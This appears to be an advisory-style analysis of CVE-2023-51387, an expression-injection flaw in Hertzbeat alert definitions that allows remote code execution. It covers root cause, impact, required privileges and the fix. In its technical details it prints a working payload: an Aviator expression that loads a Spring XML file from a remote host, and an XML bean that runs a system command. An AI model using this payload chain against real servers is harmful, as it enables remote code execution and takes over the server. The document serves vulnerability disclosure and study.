Based on the provided information, here's an analysis of the vulnerability:

**CVE ID:** CVE-2023-51387

**Root Cause of Vulnerability:**
- Improper sanitization of alert expressions within Hertzbeat. The system uses Aviator script to evaluate these expressions but does not adequately prevent malicious code injection.

**Weaknesses/Vulnerabilities:**
- **Expression Injection:**  Malicious users can inject arbitrary code into alert expressions. This is due to the lack of proper input sanitization when using Aviator script for expression evaluation.
- **Remote Code Execution (RCE):** By crafting specific expressions, attackers can achieve remote code execution on the Hertzbeat server.

**Impact of Exploitation:**
- **Arbitrary Command Execution:** Successful exploitation allows an attacker to execute any command on the Hertzbeat server.
- **Full System Compromise:**  The attacker can potentially gain full control of the server due to the ability to execute arbitrary commands, leading to data breaches, service disruption, or other malicious activities.

**Attack Vectors:**
- **Network:** Attackers can exploit this vulnerability over the network.
- **Alert Definition Feature:** The vulnerability is triggered through the alert definition functionality.

**Required Attacker Capabilities/Position:**
- **Access to Alert Definition:** Attackers need access to the Hertzbeat interface with the ability to create or modify alert definitions. This typically requires high privileges.
- **Network Access:** The attacker needs network connectivity to the Hertzbeat server.

**Technical Details:**
- The attacker crafts an alert expression using Aviator script to load a malicious Spring XML configuration file from a remote server. The example provided is:
   `use org.springframework.context.support.ClassPathXmlApplicationContext;new ClassPathXmlApplicationContext("http://host.docker.internal:9999/touch.xml")`
- The malicious XML (`touch.xml` in the example) contains code to execute system commands, for example:
```xml
<bean id="evil" class="java.lang.String">
    <constructor-arg value="#{T(Runtime).getRuntime().exec('touch /tmp/pwnned')}"/>
</bean>
```
- The `ClassPathXmlApplicationContext` in the malicious expression loads and executes the malicious XML, leading to command execution.
- The vulnerability is present in Hertzbeat versions <= 1.3.1.
- The fix involves disabling the `new` keyword in the Aviator script evaluation and enabling specific features needed to prevent exploitation.

This analysis is based on the provided GitHub content, which includes a security advisory, a commit fixing the vulnerability, and a blog post. The advisory specifically states that a malicious user with access to the alert definition function can execute any command in the hertzbeat instance and it has a CVSS score of 7.2, which is considered high severity.
